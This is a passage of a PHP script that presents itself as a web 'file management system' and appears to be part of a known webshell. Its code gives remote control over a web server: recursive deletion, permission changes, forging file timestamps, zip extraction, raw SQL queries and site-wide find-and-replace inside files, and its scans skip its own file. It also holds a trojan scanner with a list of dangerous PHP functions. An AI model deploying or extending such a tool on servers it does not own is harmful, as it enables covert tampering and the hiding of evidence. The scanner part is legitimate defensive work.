  $padding_top='';
  $header ='';

  if(!isset($_GET['eanver'])){



$data_json = trim(file_get_contents('./phpcode/mytag.js'),'jsontag_data=');

  // 解析json
$data = json_decode($data_json,true);

$tagstr ="";
//var_dump($data);

foreach($data as $key=>$val){


$tagstr.="<a class='tag' href='javascript:void(0);'  title='".base64_decode($val['path'])."'  onclick=setpath('".base64_decode($val[path])."') >".base64_decode($val['name'])."</a>";


}



  $padding_top=' '; 
  $header =' ';

  }


    $str = <<<end
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />	
</head>
<style type="text/css">
	*{padding:0px;margin:0px;}
	table.tablecontent tr:hover td{ background:#444; cursor:pointer;}

    .tag{ margin:0 2px; color:#333; border-left:1px solid #ccc; padding-left:5px;}  
	
	body,td{font-size: 12px;color:#00ff00;background:#292929;}input,select,textarea{font-size: 12px;background-color:#FFFFCC;border:1px solid #fff}
	body{color:#FFFFFF;font-family:Verdana, Arial, Helvetica, sans-serif;
	height:100%;overflow-y:auto;background:#333333;SCROLLBAR-FACE-COLOR: #232323; SCROLLBAR-HIGHLIGHT-COLOR: #232323; SCROLLBAR-SHADOW-COLOR: #383838; SCROLLBAR-DARKSHADOW-COLOR: #383838; SCROLLBAR-3DLIGHT-COLOR: #232323; SCROLLBAR-ARROW-COLOR: #FFFFFF;SCROLLBAR-TRACK-COLOR: #383838;}
	input,select,textarea{background-color:#FFFFCC;border:1px solid #FFFFFF}
    a{color:#ddd;text-decoration: none;}
    a:hover{color:red; }
    
	.actall{background:#000000;font-size:14px;border:1px solid #999999;padding:2px;margin-top:3px;margin-bottom:3px;clear:both;}
	
	table.tablecontent tr.hover td{ background:#555; cursor:pointer;}  
	
	.layui-btn-normal {
    background-color: #1E9FFF;
}
 
.layui-btn {
    display: inline-block;
    height: 38px;
    line-height: 38px;
    padding: 0 18px;
    background-color: #009688;
    color: #fff;
    white-space: nowrap;
    text-align: center;
    font-size: 14px;
    border: none;
    border-radius: 2px;
    cursor: pointer;
}
.layui-layer-content{ color: #666;} 
	</STYLE>
 
<script type="text/javascript" >


function setpath(path){

 //alert(path);

$('#right_main').attr('src','?eanver=main&path='+path);


}

 
 
 

</script>
	
	<body style="table-layout:fixed;word-break:break-all; FILTER: progid:DXImageTransform.Microsoft.Gradient(gradientType=0,startColorStr=#626262,endColorStr=#1C1C1C); $padding_top ">

     $header
	<table width="99.9%" border=0 bgcolor="#555555" align="center">
end;
    html_n($str);
    css_js('1'); 
}

function css_foot()
{
    html_n("</td></tr></table>");
}

function do_write($file, $t, $text)
{
    $key = true;
    $handle = @fopen($file, $t);
    if ($text != "") {
        if (!@fwrite($handle, $text)) {
            @chmod($file, 0666);
            $key = @fwrite($handle, $text) ? true : false;
        }
    }
    @fclose($handle);
    return $key;
}

function do_show($filepath)
{
    $show = array();
    $dir = dir($filepath);
    while ($file = $dir->read()) {
        if ($file == '.' or $file == '..') continue;
        $files = str_path($filepath . '/' . $file);
        $show[] = $files;
    }
    $dir->close();
    return $show;
}

function delDirAndFile($path)
{
    if (is_dir($path)) {
        $file_list = scandir($path);
        foreach ($file_list as $file) {
            if ($file != '.' && $file != '..') {
                delDirAndFile($path . '/' . $file);//递归删除
            }
        }
        @rmdir($path);//删除空目录
    } else if (is_file($path)) {
        @chmod($path, 0777);
        @unlink($path);//删除文件
    }
}


function do_showsql($query, $conn)
{
    $result = @mysql_query($query, $conn);
    html_n('<br><br><textarea cols="70" rows="15">');
    while ($row = @mysql_fetch_array($result)) {
        for ($i = 0; $i < @mysql_num_fields($result); $i++) {
            html_n(htmlspecialchars($row[$i]));
        }
    }
    html_n('</textarea>');
}

function do_down($fd)
{
    if (!@file_exists($fd)) msg("下载文件不存在");
    $fileinfo = pathinfo($fd);
    header("Content-type: application/x-" . $fileinfo['extension']);
    header("Content-Disposition: attachment; filename=" . $fileinfo['basename']);
    header("Content-Length: " . filesize($fd));
    @readfile($fd);
    exit;
}

function do_download($filecode, $file)
{
    header("Content-type: application/unknown");
    header("Accept-Ranges: bytes");
    header("Content-length: " . strlen($filecode));
    header("Content-Disposition: attachment; filename=" . $file . ";");
    echo $filecode;
    exit;
}

function mb_is_utf8($string)
{
    return mb_detect_encoding($string, 'UTF-8') === 'UTF-8';
}

function do_passreturn($dir, $code, $type, $bool, $filetype = '', $shell = my_shell)
{
    $show = do_show($dir);
    global  $matches_muma_preg;
   if (!$_SERVER['SERVER_NAME']) $GETURL = ''; else $GETURL = 'http://' . $_SERVER['SERVER_NAME'] . '/';
    $ROOT_DIR = File_Mode();

    foreach ($show as $files) {
        if (is_dir($files) && $bool) {
            do_passreturn($files, $code, $type, $bool, $filetype, $shell);
        } else {
            if ($files == $shell) continue;
            switch ($type) {

                case "tihuan":
                    $filecode = @implode('', @file($files));
                    if (stristr($filecode, $code)) {
                        $newcode = str_replace($code, $filetype, $filecode);
                        do_write($files, "wb", $newcode) ? html_n("成功--> " . $files . "<br>") : html_n("失败--> " . $files . "<br>");
                    }
                    break;
                case "scanfile":
                    $file = explode('/', $files);
                    if (stristr($file[count($file) - 1], $code)) {
                        html_a("?eanver=editr&p=" . $files, $files);
                        echo '<br>';
                    }
                    break;
                case "scancode":
                    $filecode = @implode('', @file($files));
                    if (stristr($filecode, $code)) {
                        html_a("?eanver=editr&p=" . $files, $files);
                        echo '<br>';
                    }
                    break;
                case "scanphp":
                    $fileinfo = pathinfo($files);
                    //print_r($files);
                    if (strpos(strtolower($fileinfo['extension']),$code)!==false){  
                        $filecode = @implode('', @file($files));

                        $recode = muma($filecode, $code);
                        if ($recode) {
                            static $file_index = 1;
                            echo '(' . $file_index . ')特征: <input type="text" class="muma_fun" style="background-color:#fff;color:red; width:90%;"  value="' . htmlspecialchars($recode) . '" ><br/>';
                            $file_index++;
                            echo "位置：" . $files. ' ';

                            //查看
 
                            $filepath = $files;
        
                            $Fileurls = str_replace(File_Str($ROOT_DIR . '/'), $GETURL, $filepath);
                            $todir = $ROOT_DIR . '/';
                            $filepath = urlencode($filepath);
                            $it = substr($filepath, -3);

                            html_a($Fileurls, '访问', 'target="_blank"');
                            echo " | ";
                            html_a("?eanver=editr&p=" . urlencode($files), " 编辑  ");

                            echo " | ";
                            // html_a("?eanver=del&p=" . urlencode($files), " 删除");
 
                           html_n("<a href='#' onClick=\"rusuredel('" . $files . "','?eanver=del&p=" . urlencode($files) . "');return false;\">删除</a>");


                           
                             
                            

                            echo '<br>';

                            //输出文件的内容1200个字符

                            // $FILE_CODE = file_get_contents($files);

                              $fp = fopen($files, "rb");//打开文件

                             $FILE_CODE = fread($fp, 120000);    

                             $FILE_CODE = characet($FILE_CODE);
                             

                           // 换种格式的 
                           /* echo '预览：<textarea  name="code[]" style="width:100%;overflow:hidden; background-color:#fff; height:500px;margin:10px 0px;"  >' . htmlspecialchars($FILE_CODE) . '</textarea>';
                           */
      $file_content = $FILE_CODE;
       
        foreach($matches_muma_preg as $matche) { 
            $array = array();
            preg_match($matche,$file_content,$array);
            if(!$array) continue;
            $hlcode = $array[0];
            $file_content = str_replace($hlcode, '{#@SPAN1@#}'.$hlcode.'{#@SSPAN@#}', $file_content);
        }

        $danger_fun='array_map|eval|eval_r|assert|passthru|exec|system|shell_exec|popen|proc_open|socket_listen|socket_connect|stream_socket_server|base64_decode|base64_encode|str_rot13|gzinflate|gzuncompress|curl_init|copy|chmod|move_uploaded_file|file_get_contents|file_put_contents|fopen|fputs|fwrite|preg_replace|create_function|call_user_func|\*\/'; 
 
         $file_content = preg_replace("/($danger_fun)[\s]*\(/s", '{#@SPAN2@#}${1}({#@SSPAN@#}', $file_content);
 
        $file_content = toHtmlChars($file_content);
        $file_content = str_replace('{#@SPAN1@#}','<span style="color:red; " id="t1">',$file_content); 
        $file_content = str_replace('{#@SPAN2@#}','<span style="color:red; " id="t2">',$file_content); 
 
        $file_content = str_replace('{#@SSPAN@#}','</span>',$file_content);
        echo('<div class="codeview" style="width:1500px; background:#efefef; color:#666; height:300px; overflow:hidden;overflow-y:scroll; border:2px solid #ccc;">');
     
        echo(' '.$file_content.' ');
        
        echo('</div>');







                        }
                    }

                    break;
            }
        }
    }

}

class PHPzip
{

    var $file_count = 0;
    var $datastr_len = 0;
    var $dirstr_len = 0;
    var $filedata = '';
    var $gzfilename;
    var $fp;
    var $dirstr = '';

    function unix2DosTime($unixtime = 0)
    {
        $timearray = ($unixtime == 0) ? getdate() : getdate($unixtime);

        if ($timearray['year'] < 1980) {
            $timearray['year'] = 1980;
            $timearray['mon'] = 1;
            $timearray['mday'] = 1;
            $timearray['hours'] = 0;
            $timearray['minutes'] = 0;
            $timearray['seconds'] = 0;
        }

        return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) | ($timearray['mday'] << 16) |
            ($timearray['hours'] << 11) | ($timearray['minutes'] << 5) | ($timearray['seconds'] >> 1);
    }

    function startfile($path = 'wwwroot.zip')
    {
        $this->gzfilename = $path;
        if ($this->fp = @fopen($this->gzfilename, "w")) {
            return true;
        }
        return false;
    }

    function addfile($data, $name)
    {
        $name = str_replace('\\', '/', $name);

        if (strrchr($name, '/') == '/') return $this->adddir($name);

        $dtime = dechex($this->unix2DosTime());
        $hexdtime = '\x' . $dtime[6] . $dtime[7] . '\x' . $dtime[4] . $dtime[5] . '\x' . $dtime[2] . $dtime[3] . '\x' . $dtime[0] . $dtime[1];
        eval('$hexdtime = "' . $hexdtime . '";');
        $unc_len = strlen($data);
        $crc = crc32($data);
        $zdata = gzcompress($data);
        $c_len = strlen($zdata);
        $zdata = substr(substr($zdata, 0, strlen($zdata) - 4), 2);

        $datastr = "\x50\x4b\x03\x04";
        $datastr .= "\x14\x00";
        $datastr .= "\x00\x00";
        $datastr .= "\x08\x00";
        $datastr .= $hexdtime;
        $datastr .= pack('V', $crc);
        $datastr .= pack('V', $c_len);
        $datastr .= pack('V', $unc_len);
        $datastr .= pack('v', strlen($name));
        $datastr .= pack('v', 0);
        $datastr .= $name;
        $datastr .= $zdata;
        $datastr .= pack('V', $crc);
        $datastr .= pack('V', $c_len);
        $datastr .= pack('V', $unc_len);


        fwrite($this->fp, $datastr);
        $my_datastr_len = strlen($datastr);
        unset($datastr);

        $dirstr = "\x50\x4b\x01\x02";
        $dirstr .= "\x00\x00";
        $dirstr .= "\x14\x00";
        $dirstr .= "\x00\x00";
        $dirstr .= "\x08\x00";
        $dirstr .= $hexdtime;
        $dirstr .= pack('V', $crc);
        $dirstr .= pack('V', $c_len);
        $dirstr .= pack('V', $unc_len);
        $dirstr .= pack('v', strlen($name));
        $dirstr .= pack('v', 0);
        $dirstr .= pack('v', 0);
        $dirstr .= pack('v', 0);
        $dirstr .= pack('v', 0);
        $dirstr .= pack('V', 32);
        $dirstr .= pack('V', $this->datastr_len);
        $dirstr .= $name;

        $this->dirstr .= $dirstr;

        $this->file_count++;
        $this->dirstr_len += strlen($dirstr);
        $this->datastr_len += $my_datastr_len;
    }

    function adddir($name)
    {
        $name = str_replace("\\", "/", $name);
        $datastr = "\x50\x4b\x03\x04\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00";

        $datastr .= pack("V", 0) . pack("V", 0) . pack("V", 0) . pack("v", strlen($name));
        $datastr .= pack("v", 0) . $name . pack("V", 0) . pack("V", 0) . pack("V", 0);

        fwrite($this->fp, $datastr);
        $my_datastr_len = strlen($datastr);
        unset($datastr);

        $dirstr = "\x50\x4b\x01\x02\x00\x00\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00";
        $dirstr .= pack("V", 0) . pack("V", 0) . pack("V", 0) . pack("v", strlen($name));
        $dirstr .= pack("v", 0) . pack("v", 0) . pack("v", 0) . pack("v", 0);
        $dirstr .= pack("V", 16) . pack("V", $this->datastr_len) . $name;

        $this->dirstr .= $dirstr;

        $this->file_count++;
        $this->dirstr_len += strlen($dirstr);
        $this->datastr_len += $my_datastr_len;
    }

    function createfile()
    {
        $endstr = "\x50\x4b\x05\x06\x00\x00\x00\x00" .
            pack('v', $this->file_count) .
            pack('v', $this->file_count) .
            pack('V', $this->dirstr_len) .
            pack('V', $this->datastr_len) .
            "\x00\x00";

        fwrite($this->fp, $this->dirstr . $endstr);
        fclose($this->fp);
    }
}

class eanver
{
    var $out = '';

    function __construct($dir)
    {
        if (@function_exists('gzcompress')) {
            if (count($dir) > 0) {
                foreach ($dir as $file) {
                    if (is_file($file)) {
                        $filecode = implode('', @file($file));
                        if (is_array($dir)) $file = basename($file);
                        $this->filezip($filecode, $file);
                    }
                }
                $this->out = $this->packfile();
            }
            return true;
        } else return false;
    }

    var $datasec = array();
    var $ctrl_dir = array();
    var $eof_ctrl_dir = "\x50\x4b\x05\x06\x00\x00\x00\x00";
    var $old_offset = 0;

    function at($atunix = 0)
    {
        $unixarr = ($atunix == 0) ? getdate() : getdate($atunix);
        if ($unixarr['year'] < 1980) {
            $unixarr['year'] = 1980;
            $unixarr['mon'] = 1;
            $unixarr['mday'] = 1;
            $unixarr['hours'] = 0;
            $unixarr['minutes'] = 0;
            $unixarr['seconds'] = 0;
        }
        return (($unixarr['year'] - 1980) << 25) | ($unixarr['mon'] << 21) | ($unixarr['mday'] << 16) |
            ($unixarr['hours'] << 11) | ($unixarr['minutes'] << 5) | ($unixarr['seconds'] >> 1);
    }

    function filezip($data, $name, $time = 0)
    {
        $name = str_replace('\\', '/', $name);
        $dtime = dechex($this->at($time));
        $hexdtime = '\x' . $dtime[6] . $dtime[7]
            . '\x' . $dtime[4] . $dtime[5]
            . '\x' . $dtime[2] . $dtime[3]
            . '\x' . $dtime[0] . $dtime[1];
        eval('$hexdtime = "' . $hexdtime . '";');
        $fr = "\x50\x4b\x03\x04";
        $fr .= "\x14\x00";
        $fr .= "\x00\x00";
        $fr .= "\x08\x00";
        $fr .= $hexdtime;
        $unc_len = strlen($data);
        $crc = crc32($data);
        $zdata = gzcompress($data);
        $c_len = strlen($zdata);
        $zdata = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
        $fr .= pack('V', $crc);
        $fr .= pack('V', $c_len);
        $fr .= pack('V', $unc_len);
        $fr .= pack('v', strlen($name));
        $fr .= pack('v', 0);
        $fr .= $name;
        $fr .= $zdata;
        $fr .= pack('V', $crc);
        $fr .= pack('V', $c_len);
        $fr .= pack('V', $unc_len);
        $this->datasec[] = $fr;
        $new_offset = strlen(implode('', $this->datasec));
        $cdrec = "\x50\x4b\x01\x02";
        $cdrec .= "\x00\x00";
        $cdrec .= "\x14\x00";
        $cdrec .= "\x00\x00";
        $cdrec .= "\x08\x00";
        $cdrec .= $hexdtime;
        $cdrec .= pack('V', $crc);
        $cdrec .= pack('V', $c_len);
        $cdrec .= pack('V', $unc_len);
        $cdrec .= pack('v', strlen($name));
        $cdrec .= pack('v', 0);
        $cdrec .= pack('v', 0);
        $cdrec .= pack('v', 0);
        $cdrec .= pack('v', 0);
        $cdrec .= pack('V', 32);
        $cdrec .= pack('V', $this->old_offset);
        $this->old_offset = $new_offset;
        $cdrec .= $name;
        $this->ctrl_dir[] = $cdrec;
    }

    function packfile()
    {
        $data = implode('', $this->datasec);
        $ctrldir = implode('', $this->ctrl_dir);
        return $data . $ctrldir . $this->eof_ctrl_dir . pack('v', sizeof($this->ctrl_dir)) . pack('v', sizeof($this->ctrl_dir)) . pack('V', strlen($ctrldir)) . pack('V', strlen($data)) . "\x00\x00";
    }
}

class zip
{
    var $total_files = 0;
    var $total_folders = 0;

    function Extract($zn, $to, $index = Array(-1))
    {
        $ok = 0;
        $zip = @fopen($zn, 'rb');
        if (!$zip) return (-1);
        $cdir = $this->ReadCentralDir($zip, $zn);
        $pos_entry = $cdir['offset'];

        if (!is_array($index)) {
            $index = array($index);
        }
        for ($i = 0; $index[$i]; $i++) {
            if (intval($index[$i]) != $index[$i] || $index[$i] > $cdir['entries'])
                return (-1);
        }
        for ($i = 0; $i < $cdir['entries']; $i++) {
            @fseek($zip, $pos_entry);
            $header = $this->ReadCentralFileHeaders($zip);
            $header['index'] = $i;
            $pos_entry = ftell($zip);
            @rewind($zip);
            fseek($zip, $header['offset']);
            if (in_array("-1", $index) || in_array($i, $index))
                $stat[$header['filename']] = $this->ExtractFile($header, $to, $zip);
        }
        fclose($zip);
        return $stat;
    }

    function ReadFileHeader($zip)
    {
        $binary_data = fread($zip, 30);
        $data = unpack('vchk/vid/vversion/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len', $binary_data);

        $header['filename'] = fread($zip, $data['filename_len']);
        if ($data['extra_len'] != 0) {
            $header['extra'] = fread($zip, $data['extra_len']);
        } else {
            $header['extra'] = '';
        }

        $header['compression'] = $data['compression'];
        $header['size'] = $data['size'];
        $header['compressed_size'] = $data['compressed_size'];
        $header['crc'] = $data['crc'];
        $header['flag'] = $data['flag'];
        $header['mdate'] = $data['mdate'];
        $header['mtime'] = $data['mtime'];

        if ($header['mdate'] && $header['mtime']) {
            $hour = ($header['mtime'] & 0xF800) >> 11;
            $minute = ($header['mtime'] & 0x07E0) >> 5;
            $seconde = ($header['mtime'] & 0x001F) * 2;
            $year = (($header['mdate'] & 0xFE00) >> 9) + 1980;
            $month = ($header['mdate'] & 0x01E0) >> 5;
            $day = $header['mdate'] & 0x001F;
            $header['mtime'] = mktime($hour, $minute, $seconde, $month, $day, $year);
        } else {
            $header['mtime'] = time();
        }

        $header['stored_filename'] = $header['filename'];
        $header['status'] = "ok";
        return $header;
    }

    function ReadCentralFileHeaders($zip)
    {
        $binary_data = fread($zip, 46);
        $header = unpack('vchkid/vid/vversion/vversion_extracted/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len/vcomment_len/vdisk/vinternal/Vexternal/Voffset', $binary_data);

        if ($header['filename_len'] != 0)
            $header['filename'] = fread($zip, $header['filename_len']);
        else $header['filename'] = '';

        if ($header['extra_len'] != 0)
            $header['extra'] = fread($zip, $header['extra_len']);
        else $header['extra'] = '';

        if ($header['comment_len'] != 0)
            $header['comment'] = fread($zip, $header['comment_len']);
        else $header['comment'] = '';

        if ($header['mdate'] && $header['mtime']) {
            $hour = ($header['mtime'] & 0xF800) >> 11;
            $minute = ($header['mtime'] & 0x07E0) >> 5;
            $seconde = ($header['mtime'] & 0x001F) * 2;
            $year = (($header['mdate'] & 0xFE00) >> 9) + 1980;
            $month = ($header['mdate'] & 0x01E0) >> 5;
            $day = $header['mdate'] & 0x001F;
            $header['mtime'] = mktime($hour, $minute, $seconde, $month, $day, $year);
        } else {
            $header['mtime'] = time();
        }
        $header['stored_filename'] = $header['filename'];
        $header['status'] = 'ok';
        if (substr($header['filename'], -1) == '/')
            $header['external'] = 0x41FF0010;
        return $header;
    }

    function ReadCentralDir($zip, $zip_name)
    {
        $size = filesize($zip_name);

        if ($size < 277) $maximum_size = $size;
        else $maximum_size = 277;

        @fseek($zip, $size - $maximum_size);
        $pos = ftell($zip);
        $bytes = 0x00000000;

        while ($pos < $size) {
            $byte = @fread($zip, 1);
            $bytes = ($bytes << 8) | ord($byte);
            if ($bytes == 0x504b0506 or $bytes == 0x2e706870504b0506) {
                $pos++;
                break;
            }
            $pos++;
        }

        $fdata = fread($zip, 18);

        $data = @unpack('vdisk/vdisk_start/vdisk_entries/ventries/Vsize/Voffset/vcomment_size', $fdata);

        if ($data['comment_size'] != 0) $centd['comment'] = fread($zip, $data['comment_size']);
        else $centd['comment'] = '';
        $centd['entries'] = $data['entries'];
        $centd['disk_entries'] = $data['disk_entries'];
        $centd['offset'] = $data['offset'];
        $centd['disk_start'] = $data['disk_start'];
        $centd['size'] = $data['size'];
        $centd['disk'] = $data['disk'];
        return $centd;
    }

    function ExtractFile($header, $to, $zip)
    {
        $header = $this->readfileheader($zip);

        if (substr($to, -1) != "/") $to .= "/";
        if ($to == './') $to = '';
        $pth = explode("/", $to . $header['filename']);
        $mydir = '';
        for ($i = 0; $i < count($pth) - 1; $i++) {
            if (!$pth[$i]) continue;
            $mydir .= $pth[$i] . "/";
            if ((!is_dir($mydir) && @mkdir($mydir, 0777)) || (($mydir == $to . $header['filename'] || ($mydir == $to && $this->total_folders == 0)) && is_dir($mydir))) {
                @chmod($mydir, 0777);
                $this->total_folders++;
                echo "DIR: $mydir<br>";
            }
        }

        if (strrchr($header['filename'], '/') == '/') return;

        if (!($header['external'] == 0x41FF0010) && !($header['external'] == 16)) {
            if ($header['compression'] == 0) {
                $fp = @fopen($to . $header['filename'], 'wb');
                if (!$fp) return (-1);
                $size = $header['compressed_size'];

                while ($size != 0) {
                    $read_size = ($size < 2048 ? $size : 2048);
                    $buffer = fread($zip, $read_size);
                    $binary_data = pack('a' . $read_size, $buffer);
                    @fwrite($fp, $binary_data, $read_size);
                    $size -= $read_size;
                }
                fclose($fp);
                touch($to . $header['filename'], $header['mtime']);
            } else {
                $fp = @fopen($to . $header['filename'] . '.gz', 'wb');
                if (!$fp) return (-1);
                $binary_data = pack('va1a1Va1a1', 0x8b1f, Chr($header['compression']),
                    Chr(0x00), time(), Chr(0x00), Chr(3));

                fwrite($fp, $binary_data, 10);
                $size = $header['compressed_size'];

                while ($size != 0) {
                    $read_size = ($size < 1024 ? $size : 1024);
                    $buffer = fread($zip, $read_size);
                    $binary_data = pack('a' . $read_size, $buffer);
                    @fwrite($fp, $binary_data, $read_size);
                    $size -= $read_size;
                }

                $binary_data = pack('VV', $header['crc'], $header['size']);
                fwrite($fp, $binary_data, 8);
                fclose($fp);

                $gzp = @gzopen($to . $header['filename'] . '.gz', 'rb') or die("Cette archive est compress");
                if (!$gzp) return (-2);
                $fp = @fopen($to . $header['filename'], 'wb');
                if (!$fp) return (-1);
                $size = $header['size'];

                while ($size != 0) {
                    $read_size = ($size < 2048 ? $size : 2048);
                    $buffer = gzread($gzp, $read_size);
                    $binary_data = pack('a' . $read_size, $buffer);
                    @fwrite($fp, $binary_data, $read_size);
                    $size -= $read_size;
                }
                fclose($fp);
                gzclose($gzp);

                touch($to . $header['filename'], $header['mtime']);
                @unlink($to . $header['filename'] . '.gz');

            }
        }

        $this->total_files++;
        echo "FILE: $to$header[filename]<br>";
        return true;
    }
}

function start_unzip($tt, $tmp_name, $new_name, $todir = 'zipfile')
{
    if ($tt == '1') {
        $z = new Zip;
        $have_zip_file = 0;
        $upfile = array("tmp_name" => $tmp_name, "name" => $new_name);
        if (is_file($upfile[tmp_name])) {
            $have_zip_file = 1;
            echo "<br>正在解压: " . $upfile[name] . "<br><br>";
            if (preg_match('/\.zip$/mis', $upfile[name])) {
                $result = $z->Extract($upfile[tmp_name], $todir);
                if ($result == -1) {
                    echo "<br>文件 " . $upfile[name] . " 错误.<br>";
                }
                echo "<br>完成,共建立 " . $z->total_folders . " 个目录," . $z->total_files . " 个文件.<br><br><br>";
            } else {
                echo "<br>" . $upfile[name] . " 不是 zip 文件.<br><br>";
            }
            if (realpath($upfile[name]) != realpath($upfile[tmp_name])) {
                @unlink($upfile[name]);
                rename($upfile[tmp_name], $upfile[name]);
            }
        }
    } elseif ($tt == '2') {
        $zip = new ZipArchive();
        if ($zip->open($tmp_name) !== TRUE) {
            echo "抱歉！压缩包无法打开或损坏";
        }
        $zip->extractTo($todir);
        $zip->close();
    } elseif ($tt == '3') {
        $phar = new PharData($tmp_name);
        $phar->extractTo($todir, null, true);
    }
    echo '解压完毕！&nbsp;&nbsp;&nbsp;<a href="?eanver=main&path=' . urlencode($todir) . '">进入解压目录</a>&nbsp;&nbsp;&nbsp;<a href="javascript:history.go(-1);">返回</a>';
}

function listfiles($dir = ".", $faisunZIP, $mydir)
{
    $sub_file_num = 0;
    if (is_file($mydir . "$dir")) {
        if (realpath($faisunZIP->gzfilename) != realpath($mydir . "$dir")) {
            $faisunZIP->addfile(file_get_contents($mydir . $dir), "$dir");
            return 1;
        }
        return 0;
    }

    $handle = opendir($mydir . "$dir");
    while ($file = readdir($handle)) {
        if ($file == "." || $file == "..") continue;
        if (is_dir($mydir . "$dir/$file")) {
            $sub_file_num += listfiles("$dir/$file", $faisunZIP, $mydir);
        } else {
            if (realpath($faisunZIP->gzfilename) != realpath($mydir . "$dir/$file")) {
                $faisunZIP->addfile(file_get_contents($mydir . $dir . "/" . $file), "$dir/$file");
                $sub_file_num++;
            }
        }
    }
    closedir($handle);
    if (!$sub_file_num) $faisunZIP->addfile("", "$dir/");
    return $sub_file_num;
}

function num_bitunit($num)
{
    $bitunit = array(' B', ' KB', ' MB', ' GB');
    for ($key = 0; $key < count($bitunit); $key++) {
        if ($num >= pow(2, 10 * $key) - 1) {
            $num_bitunit_str = (ceil($num / pow(2, 10 * $key) * 100) / 100) . " $bitunit[$key]";
        }
    }
    return $num_bitunit_str;
}

function File_Act($array, $actall, $inver)
{
    if (($count = count($array)) == 0)
        return "请选择文件";
    if ($actall == 'e') {
        $mydir = $_GET['path'] . '/';
        $inver = urldecode($inver);
        if (is_array($array)) {
            $faisunZIP = new PHPzip;
            if ($faisunZIP->startfile("$inver")) {
                $filenum = 0;
                foreach ($array as $file) {
                    $filenum += listfiles($file, $faisunZIP, $mydir);
                }
                $faisunZIP->createfile();
                return "压缩完成,共添加 " . $filenum . " 个文件.<br><a href='" . $inver . "'>点击下载 " . $inver . " (" . num_bitunit(filesize("$inver")) . ")</a>";
            } else {
                return $inver . " 不能写入,请检查路径或权限是否正确.<br>";
            }
        } else {
            return "没有选择的文件或目录.<br>";
        }
    }
    $i = 0;
    while ($i < $count) {
        $array[$i] = urldecode($array[$i]);
        switch ($actall) {
            case "a" :
                $inver = urldecode($inver);
                if (!is_dir($inver))
                    return "路径错误";
                $filename = array_pop(explode('/', $array[$i]));
                $suc = @copy($array[$i], File_Str($inver . '/' . $filename)) ? "成功" : "失败";
                $msg = "复制到" . $inver . "目录" . $suc;
                break;
            case "b" :
                $para_type = 1;
                if (is_dir($array[$i]))
                    $para_type = 2;
                delDirAndFile($array[$i]);
                if ($para_type == 1) {
                    $suc = !is_file($array[$i]) ? "成功" : "失败";
                } else if ($para_type == 2) {
                    $suc = !is_dir($array[$i]) ? "成功" : "失败";
                }
                $msg = "删除" . $suc;
                break;
            case "c" :
                if (!preg_match("/^[0-7]{4}$/", $inver))
                    return "属性值错误";
                $newmode = base_convert($inver, 8, 10);
                $suc = @chmod($array[$i], $newmode) ? "成功" : "失败";
                $msg = "属性修改为" . $inver . $suc;
                break;
            case "d" :
                $suc = @touch($array[$i], strtotime($inver)) ? "成功" : "失败";
                if ($suc == "失败") {
                    @chmod($array[$i], 0666);
                    $suc = @touch($array[$i], strtotime($inver)) ? "成功" : "失败";
                }
                $msg = "时间修改为" . $inver . $suc;
                break;
        }
        $i++;
    }
    return "所选文件" . $msg;
}

function myunescape($str)
{
    $str = rawurldecode($str);
    preg_match_all("/%u.{4}|&#x.{4};|&#\d+;|.+/U", $str, $r);
    $ar = $r [0];
    foreach ($ar as $k => $v) {
        if (substr($v, 0, 2) == "%u")
            $ar [$k] = iconv("UCS-2", "GBK", pack("H4", substr($v, -4)));
        elseif (substr($v, 0, 3) == "&#x")
            $ar [$k] = iconv("UCS-2", "GBK", pack("H4", substr($v, 3, -1)));
        elseif (substr($v, 0, 2) == "&#") {
            $ar [$k] = iconv("UCS-2", "GBK", pack("n", substr($v, 2, -1)));
        }
    }
    return join("", $ar);
}

function html_base()
{
    $str = '';
    html_n($str);
}

function get_proxy_ip()
{
    $arr_ip_header = array(
        'HTTP_CDN_SRC_IP',
        'HTTP_PROXY_CLIENT_IP',
        'HTTP_WL_PROXY_CLIENT_IP',
        'HTTP_CLIENT_IP',
        'HTTP_X_FORWARDED_FOR',
        'REMOTE_ADDR',
    );
    $client_ip = 'unknown';
    foreach ($arr_ip_header as $key) {
        if (!empty($_SERVER[$key]) && strtolower($_SERVER[$key]) != 'unknown') {
            $client_ip = $_SERVER[$key];
            break;
        }
    }
    return $client_ip;
}

//主页面
function html_main()
{
    if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") {
        $hsafemode = "ON (开启)";
    } else {
        $hsafemode = "OFF (关闭)";
    }
    $Server_IP = gethostbyname($_SERVER["SERVER_NAME"]);
    $Server_OS = PHP_OS;
    $Server_Soft = $_SERVER["SERVER_SOFTWARE"];
    $web_server = php_uname();
    $title = $_SERVER["HTTP_HOST"] . "-文件管理系统";
    html_n("<html><title>" . $title . "</title>");
  

 $iframeurl ='?eanver=main';
  if($_COOKIE['iframeurl']){

    $iframeurl = $_COOKIE['iframeurl'];
 
  }


 //var_dump($iframeurl);

    html_n("<table width='100%'  height='100%'  border=0 cellpadding='0' cellspacing='0'><tr><td width='170'><iframe name='left'    id='leftnav'    src='?eanver=left' width='100%' height='100%' frameborder='0'  ></iframe></td><td><iframe id='right_main' name='main' src='".$iframeurl."' width='100%' height='100%'  frameborder='0'  ></iframe></td></tr></table></html>"); 

     
}

function refresh_page()
{
    $http_type = ((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') || (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https')) ? 'https://' : 'http://';
    $url = $http_type . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'];
    print <<<END
<script type="text/javascript">
   window.parent.location.href="{$url}";
</script>
END;
}


/*登录后界面*/
function islogin()
{
    if (count($_GET) > 0) {
        refresh_page();
        die();
    }
    $title = $_SERVER["HTTP_HOST"] . "__Login";
    $str = <<<end
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>{$title}</title>
</head>
